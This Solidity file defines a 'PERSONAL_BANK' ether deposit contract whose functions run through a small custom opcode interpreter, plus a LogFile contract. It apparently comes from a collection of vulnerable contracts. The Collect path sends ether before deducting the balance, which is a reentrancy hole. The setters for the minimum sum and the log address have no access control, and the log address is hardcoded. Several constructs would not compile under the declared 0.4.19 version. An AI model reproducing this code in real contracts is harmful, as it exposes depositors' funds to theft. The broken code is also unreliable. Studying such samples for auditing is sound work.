pragma solidity ^0.4.19;

contract PERSONAL_BANK {
    mapping (address => uint256) public balances;   
    uint public MinSum = 1 ether;
    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);
    bool intitalized;

    enum Opcode { PUSH, POP, ADD, SUB, JMP, JZ, LOAD, STORE, CALL }
    
    struct VM {
        uint pc;
        uint[] stack;
        mapping(uint => uint) memory;
    }
    
    function execute(uint[] program) internal {
        VM memory vm;
        vm.pc = 0;
        
        while (vm.pc < program.length) {
            Opcode opcode = Opcode(program[vm.pc]);
            vm.pc++;
            if (opcode == Opcode.PUSH) {
                vm.stack.push(program[vm.pc]);
                vm.pc++;
            } else if (opcode == Opcode.POP) {
                vm.stack.pop();
            } else if (opcode == Opcode.ADD) {
                uint b = vm.stack.pop();
                uint a = vm.stack.pop();
                vm.stack.push(a + b);
            } else if (opcode == Opcode.SUB) {
                uint b = vm.stack.pop();
                uint a = vm.stack.pop();
                vm.stack.push(a - b);
            } else if (opcode == Opcode.JMP) {
                vm.pc = program[vm.pc];
            } else if (opcode == Opcode.JZ) {
                uint condition = vm.stack.pop();
                if (condition == 0) {
                    vm.pc = program[vm.pc];
                } else {
                    vm.pc++;
                }
            } else if (opcode == Opcode.LOAD) {
                uint addr = program[vm.pc];
                vm.pc++;
                vm.stack.push(vm.memory[addr]);
            } else if (opcode == Opcode.STORE) {
                uint addr = program[vm.pc];
                vm.pc++;
                vm.memory[addr] = vm.stack.pop();
            } else if (opcode == Opcode.CALL) {
                if (program[vm.pc] == 1) {
                    uint _val = vm.stack.pop();
                    if(intitalized) revert();
                    MinSum = _val;
                } else if (program[vm.pc] == 2) {
                    address _log = address(vm.stack.pop());
                    if(intitalized) revert();
                    Log = LogFile(_log);
                } else if (program[vm.pc] == 3) {
                    intitalized = true;
                } else if (program[vm.pc] == 4) {
                    uint sender = uint(msg.sender);
                    uint value = uint(msg.value);
                    balances[msg.sender] += value;
                    Log.AddMessage(msg.sender, value, "Put");
                } else if (program[vm.pc] == 5) {
                    uint _am = vm.stack.pop();
                    if (balances[msg.sender] >= MinSum && balances[msg.sender] >= _am) {
                        if (msg.sender.call.value(_am)()) {
                            balances[msg.sender] -= _am;
                            Log.AddMessage(msg.sender, _am, "Collect");
                        }
                    }
                }
                vm.pc++;
            }
        }
    }
    
    function SetMinSum(uint _val) public {
        execute([uint(Opcode.PUSH), _val, uint(Opcode.CALL), 1]);
    }
    
    function SetLogFile(address _log) public {
        execute([uint(Opcode.PUSH), uint(_log), uint(Opcode.CALL), 2]);
    }
    
    function Initialized() public {
        execute([uint(Opcode.CALL), 3]);
    }
    
    function Deposit() public payable {
        execute([uint(Opcode.CALL), 4]);
    }
    
    function Collect(uint _am) public payable {
        execute([uint(Opcode.PUSH), _am, uint(Opcode.CALL), 5]);
    }
    
    function() public payable {
        Deposit();
    }
}

contract LogFile {
    struct Message {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    
    Message[] public History;
    Message LastMsg;
    
    function AddMessage(address _adr, uint _val, string _data) public {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}